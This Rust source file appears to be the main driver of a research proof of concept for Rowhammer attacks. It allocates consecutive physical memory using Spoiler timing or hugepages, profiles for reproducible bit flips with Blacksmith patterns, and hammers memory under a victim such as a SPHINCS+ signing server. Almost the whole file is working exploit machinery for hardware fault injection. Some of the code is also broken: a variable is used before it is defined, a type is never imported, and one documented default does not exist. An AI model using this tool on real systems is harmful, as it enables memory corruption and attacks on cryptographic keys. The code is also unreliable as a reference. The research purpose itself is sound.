use std::{
    collections::HashMap,
    fs::File,
    io::{stdin, BufReader, BufWriter, Write},
    ops::Range,
    time::Duration,
};

use anyhow::bail;
use bs_poc::{
    allocator::hugepage::HugepageAllocator,
    hammerer::{make_hammer, HammerResult, HammerStrategy},
    memory::{BitFlip, DataPattern, Initializable},
    victim::{HammerVictimError, VictimResult},
};
use bs_poc::{
    allocator::{self, BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap, Pfn},
    memory::ConsecCheck,
    victim,
};
use bs_poc::{
    allocator::{CoCo, HugepageRandomized, Spoiler},
    hammerer::Hammerer,
};
use bs_poc::{hammerer::blacksmith::blacksmith_config::BlacksmithConfig, victim::HammerVictim};
use bs_poc::{
    hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper},
    memory::PfnResolver,
};
use bs_poc::{hammerer::Hammering, victim::sphincs_plus::TARGET_OFFSETS_SHAKE_256S};
use bs_poc::{
    memory::{mem_configuration::MemConfiguration, GetConsecPfns, PhysAddr},
    util::PAGE_SIZE,
};
use bs_poc::{
    memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming},
    retry,
    util::init_logging_with_progress,
};
use clap::{Parser, Subcommand};
use indicatif::{MultiProgress, ProgressBar};
use itertools::Itertools;
use log::{debug, info, warn};
use rand::{rngs::StdRng, SeedableRng};
use serde::Serialize;

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser, Serialize)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load.
    #[clap(long = "load-json", default_value = "config/fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the `blacksmith` JSON file.
    #[clap(
        long = "pattern",
        default_value = "39ad622b-3bfe-4161-b860-dad5f3e6dd68"
    )]
    pattern: Option<String>,
    /// The mapping ID to load from the `blacksmith` JSON file. Optional argument, will determine most optimal pattern if omitted.
    #[clap(long = "mapping")]
    mapping: Option<String>,
    /// The allocation strategy to use.
    #[clap(long = "alloc-strategy", default_value = "spoiler")]
    alloc_strategy: AllocStrategy,
    /// The hammering strategy to use.
    #[clap(long = "hammerer", default_value = "blacksmith")]
    hammerer: HammerStrategy,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<usize>,
    /// The timeout in seconds for the hammering process. The default is 10, meaning that the hammering process will exit after 10 minutes.
    #[arg(long)]
    timeout: u64,
    /// The number of rounds to profile for vulnerable addresses.
    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
    #[arg(long, default_value = "10")]
    profiling_rounds: u64,
    /// The reproducibility threshold for a bit flip to be considered reproducible.
    /// The threshold is a fraction of the number of profiling rounds. If a bit flip is detected in at least `threshold` rounds, it is considered reproducible.
    /// The default value of 0.8 means that a bit flip must be detected in at least 80% of the profiling rounds to be considered reproducible.
    #[arg(long, default_value = "0.8")]
    reproducibility_threshold: f64,
    /// The number of hammering attempts per round.
    /// An attempt denotes a single run of the hammering code. Usually, hammerers need several attempts to successfully flip a bit in the victim.
    /// The default value of 100 is a good starting point for the blacksmith hammerer.
    #[arg(long, default_value = "100")]
    attempts: u32,
    /// Do a stats run. This will run the hammerer and store the results in the provided file. The default is `None`, causing no stats to be stored.
    /// When `stats` is set, the hammering process will not exit after the first successful attack, but continue hammering until `repeat` is reached.
    #[arg(long)]
    statistics: Option<String>,
    /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
    #[command(subcommand)]
    target: Option<Target>,
}

#[derive(Clone, Debug, Subcommand, Serialize)]
enum Target {
    SphincsPlus {
        #[clap(default_value = "victims/sphincsplus/ref/test/server")]
        binary: String,
    },
    DevMemCheck,
    #[allow(clippy::enum_variant_names)]
    TargetCheck,
    None,
}

/// The type of allocation strategy to use.
#[derive(clap::ValueEnum, Clone, Debug, Serialize)]
pub enum AllocStrategy {
    /// Use `/proc/buddyinfo` to monitor availability of page orders, assume consecutive memory according to the delta in buddyinfo.
    BuddyInfo,
    // Allocate using the CoCo dec mem module: https://git.its.uni-luebeck.de/research-projects/tdx/kmod-coco-dec-mem
    CoCo,
    /// Allocate consecutive memory using huge pages.
    Hugepage,
    /// Allocate consecutive memory using huge pages with randomization. This will return random 4 MB chunks of a 1 GB hugepage.
    HugepageRnd,
    /// Allocate consecutive memory using `bank timing`. This will `mmap` a large buffer and find consecutive memory using bank timing check
    BankTiming,
    /// Allocate a large block of memory and use pagemap to find consecutive blocks
    Pfn,
    /// Allocate consecutive memory using the Spoiler attack. This strategy will measure read-after-write pipeline conflicts to determine consecutive memory.
    Spoiler,
}

impl AllocStrategy {
    fn create_allocator(
        &self,
        mem_config: MemConfiguration,
        conflict_threshold: u64,
        progress: Option<MultiProgress>,
    ) -> allocator::ConsecAlloc {
        match self {
            AllocStrategy::BuddyInfo => ConsecAlloc::BuddyInfo(BuddyInfo::new(
                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
            )),
            AllocStrategy::CoCo => ConsecAlloc::CoCo(CoCo {}),
            AllocStrategy::BankTiming => ConsecAlloc::Mmap(Mmap::new(
                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
                progress,
            )),
            AllocStrategy::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::default()),
            AllocStrategy::HugepageRnd => ConsecAlloc::HugepageRnd(HugepageRandomized::new(1)),
            AllocStrategy::Pfn => ConsecAlloc::Pfn(Pfn::new(mem_config)),
            AllocStrategy::Spoiler => ConsecAlloc::Spoiler(Box::new(Spoiler::new(
                mem_config,
                conflict_threshold,
                progress,
            ))),
        }
    }
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry!(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

struct LoadedPattern {
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
}

fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    Ok(LoadedPattern { pattern, mapping })
}

#[derive(Debug, Serialize, Clone)]
struct RoundProfile {
    bit_flips: Vec<BitFlip>,
    pattern: DataPattern,
}

type Profiling = Vec<RoundProfile>;

/// Hammer a given `memory` region `num_rounds` times to profile for vulnerable addresses.
fn hammer_profile(
    hammerer: &Hammerer,
    memory: &ConsecBlocks,
    num_rounds: u64,
    reproducibility_threshold: f64,
    progress: Option<MultiProgress>,
) -> Profiling {
    let p = progress
        .as_ref()
        .map(|p| p.add(ProgressBar::new(num_rounds)));
    let mut rounds = vec![];

    'pattern: for pattern in [DataPattern::Random(Box::new(StdRng::from_seed(
        rand::random(),
    )))] {
        let mut candidates = HashMap::new();
        let min_repro_count = (reproducibility_threshold * num_rounds as f64) as u64;
        for r in 1..=num_rounds {
            if let Some(p) = p.as_ref() {
                p.inc(1)
            }
            if candidates.is_empty() && r > num_rounds - min_repro_count {
                warn!(
                    "No candidates and only {} round(s) left. Stopping profiling, continuing with next pattern", num_rounds - r
                );
                continue 'pattern;
            }
            let mut victim = victim::MemCheck::new(memory, pattern.clone());
            let result = hammerer.hammer(&mut victim);
            let bit_flips = match result {
                Ok(result) => {
                    info!(
                        "Profiling hammering round successful at attempt {}: {:?}",
                        result.attempt, result.victim_result
                    );
                    result.victim_result.bit_flips()
                }
                Err(e) => {
                    warn!("Profiling hammering round not successful: {:?}", e);
                    vec![]
                }
            };
            for flip in bit_flips {
                let entry = candidates.entry(flip).or_insert(0);
                *entry += 1;
            }
            let remaining_rounds = num_rounds - r;
            candidates.retain(|_, v| *v + remaining_rounds >= min_repro_count);
            info!("Profiling round {} candidates: {:?}", r, candidates);
        }
        rounds.push(RoundProfile {
            bit_flips: candidates.keys().cloned().collect(),
            pattern: pattern.clone(),
        });
    }
    rounds
}

type ExperimentError = String;

#[derive(Serialize)]
struct ExperimentData<T, E> {
    date: String,
    results: Vec<Result<T, E>>,
    profiling: Profiling,
    data: Option<serde_json::Value>,
}

impl<T, E> ExperimentData<T, E> {
    fn new(
        results: Vec<Result<T, E>>,
        profiling: Profiling,
        data: Option<serde_json::Value>,
    ) -> Self {
        Self {
            date: chrono::Local::now().to_rfc3339(),
            results,
            profiling,
            data,
        }
    }
}

fn check_timeout(timeout: Duration, start: std::time::Instant) -> bool {
    std::time::Instant::now() - start > timeout
}

unsafe fn _main() -> anyhow::Result<()> {
    let progress = init_logging_with_progress()?;

    // parse args
    let args = CliArgs::parse();

    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&config);
    let pattern = load_pattern(&args)?;

    info!("Args: {:?}", args);

    let mut alloc_strategy =
        args.alloc_strategy
            .create_allocator(mem_config, config.threshold, Some(progress.clone()));
    let block_size = alloc_strategy.block_size();

    let repetitions = match args.repeat {
        Some(repeat) => repeat,
        None => usize::MAX,
    };

    let timeout = Duration::from_secs(args.timeout * 60);

    let start = std::time::Instant::now();

    #[derive(Serialize)]
    struct HammerStatistic {
        alloc_duration_millis: u128,
        memory_regions: Vec<Range<PhysAddr>>,
        bit_flips: Vec<Vec<BitFlip>>,
    }
    let mut stats = vec![];

    let target_layer = 0;
    let mut experiments: Vec<ExperimentData<HammerResult, ExperimentError>> = vec![];
    'repeat: for _ in 0..repetitions {
        if check_timeout(timeout, start) {
            info!("Timeout reached. Stopping.");
            break;
        }
        info!("Starting bait allocation");
        let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
        let target_pfn = memory
            .addr(PAGE_SIZE + TARGET_OFFSETS_SHAKE_256S[target_layer].page_offset)
            .pfn()?;
        let alloc_duration = std::time::Instant::now() - start;
        info!("Allocated {} bytes of memory", memory.len());

        info!("Profiling memory for vulnerable addresses");
        info!(
            "Expecting bitflips at {:?}",
            pattern
                .mapping
                .get_bitflips_relocate(mem_config, block_size.ilog2() as usize, &memory)
        );
        let profile_hammer = make_hammer(
            &args.hammerer,
            &pattern.pattern,
            &pattern.mapping,
            mem_config,
            block_size,
            &memory,
            args.attempts,
            true,
            target_pfn,
            TARGET_OFFSETS_SHAKE_256S[target_layer]
                .flip_direction
                .clone(),
        )?;
        let profiling = hammer_profile(
            &profile_hammer,
            &memory,
            args.profiling_rounds,
            args.reproducibility_threshold,
            Some(progress.clone()),
        );
        debug!("Profiling results: {:?}", profiling);
        // write stats
        if let Some(stats_file) = &args.statistics {
            stats.push(HammerStatistic {
                alloc_duration_millis: alloc_duration.as_millis(),
                memory_regions: memory.consec_pfns().unwrap_or_default(),
                bit_flips: profiling
                    .iter()
                    .map(|r| r.bit_flips.clone())
                    .collect::<Vec<_>>()
                    .clone(),
            });
            info!(
                "Writing statistics to file {}",
                args.statistics.as_ref().unwrap()
            );
            let mut json_file = BufWriter::new(File::create(stats_file)?);
            serde_json::to_writer_pretty(&mut json_file, &stats)?;
            json_file.flush()?;
        }
        if profiling.is_empty() {
            warn!("No vulnerable addresses found");
            memory.dealloc();
            experiments.push(ExperimentData::new(
                vec![Err("No vulnerable addresses found".to_string())],
                profiling.clone(),
                None,
            ));
            continue;
        } else {
            info!("Profiling done. Found {:?}", profiling);
        }

        let target_profile = profiling.first().expect("no profiling rounds");
        let flip = *target_profile
            .bit_flips
            .iter()
            .sorted_by_key(|f| f.addr)
            .next()
            .expect("no flips in profiling round");

        let mut victim = match make_victim(
            args.target.clone().unwrap_or(Target::None),
            &memory,
            dpattern.clone(),
            flip,
        ) {
            Ok(victim) => victim,
            Err(e) => {
                memory.dealloc();
                warn!("Failed to start victim: {:?}", e);
                experiments.push(ExperimentData::new(vec![Err(e)], profiling.clone(), None));
                continue 'repeat;
            }
        };

        let dpattern = target_profile.pattern.clone();

        memory.initialize(dpattern.clone());
        match victim.start() {
            Ok(_) => {}
            Err(e) => {
                warn!("Failed to start victim: {:?}", e);
                memory.dealloc();
                experiments.push(ExperimentData::new(
                    vec![Err(format!("Failed to start victim: {:?}", e))],
                    profiling.clone(),
                    Some(serde_json::to_value(&victim).expect("failed to serialize victim")),
                ));
                victim.stop();
                continue 'repeat;
            }
        }
        let hammer = make_hammer(
            &args.hammerer,
            &pattern.pattern,
            &pattern.mapping,
            mem_config,
            block_size,
            &memory,
            args.attempts,
            false, // this MUST be false for SphincsPlus victim (due to SIGSTOP handlers)
            target_pfn,
            TARGET_OFFSETS_SHAKE_256S[target_layer]
                .flip_direction
                .clone(),
        )?;
        let mut results = vec![];
        loop {
            if check_timeout(timeout, start) {
                info!("Timeout reached. Stopping.");
                break;
            }
            let result = hammer.hammer(&mut victim);
            match result {
                Ok(result) => {
                    info!("Hammering successful: {:?}", result.victim_result);
                    results.push(Ok(result));
                }
                Err(HammerVictimError::NoFlips) => {
                    warn!("No flips detected");
                    results.push(Err("No flips detected".to_string()));
                }
                Err(e) => {
                    warn!("Hammering failed: {:?}", e);
                    results.push(Err(format!("Hammering failed: {:?}", e)));
                    break;
                }
            }
        }
        experiments.push(ExperimentData::new(
            results,
            profiling.clone(),
            Some(serde_json::to_value(&victim).expect("failed to serialize victim")),
        ));
        victim.stop();
        memory.dealloc();
    }
    let now = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
    let results_file = format!("results/results_{}.json", now);
    info!(
        "Timeout reached. Writing experiment results to file {}.",
        results_file
    );
    #[derive(Serialize)]
    struct ExperimentResult {
        args: CliArgs,
        experiments: Vec<ExperimentData<HammerResult, ExperimentError>>,
    }
    let res = ExperimentResult { args, experiments };
    let mut json_file = BufWriter::new(File::create(results_file)?);
    serde_json::to_writer_pretty(&mut json_file, &res)?;
    json_file.flush()?;
    Ok(())
}

#[allow(clippy::result_large_err)]
fn make_victim(
    target: Target,
    memory: &dyn VictimMemory,
    dpattern: DataPattern,
    flip: BitFlip,
) -> Result<Victim<'_>, ExperimentError> {
    match target {
        Target::SphincsPlus { binary } => Ok(Victim::SphincsPlus(
            victim::SphincsPlus::new(binary, flip).map_err(|e| {
                warn!("Failed to create victim: {}", e);
                format!("Failed to create victim: {}", e)
            })?,
        )),
        Target::DevMemCheck => Ok(Victim::DevMemCheck(
            victim::DevMemCheck::new(vec![flip]).map_err(|e| {
                warn!("Failed to create victim: {}", e);
                format!("Failed to create victim: {}", e)
            })?,
        )),
        Target::TargetCheck => Ok(Victim::TargetCheck(victim::TargetCheck::new(
            memory,
            dpattern,
            vec![flip],
        ))),
        Target::None => Err("No target specified".to_string()),
    }
}

#[derive(Serialize)]
enum Victim<'a> {
    SphincsPlus(victim::SphincsPlus),
    DevMemCheck(victim::DevMemCheck),
    TargetCheck(victim::TargetCheck<'a>),
}

impl HammerVictim for Victim<'_> {
    fn start(&mut self) -> Result<(), HammerVictimError> {
        match self {
            Victim::SphincsPlus(v) => v.start(),
            Victim::DevMemCheck(v) => v.start(),
            Victim::TargetCheck(v) => v.start(),
        }
    }

    fn init(&mut self) {
        match self {
            Victim::SphincsPlus(v) => v.init(),
            Victim::DevMemCheck(v) => v.init(),
            Victim::TargetCheck(v) => v.init(),
        }
    }

    fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
        match self {
            Victim::SphincsPlus(v) => v.check(),
            Victim::DevMemCheck(v) => v.check(),
            Victim::TargetCheck(v) => v.check(),
        }
    }

    fn stop(&mut self) {
        match self {
            Victim::SphincsPlus(v) => v.stop(),
            Victim::DevMemCheck(v) => v.stop(),
            Victim::TargetCheck(v) => v.stop(),
        }
    }
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
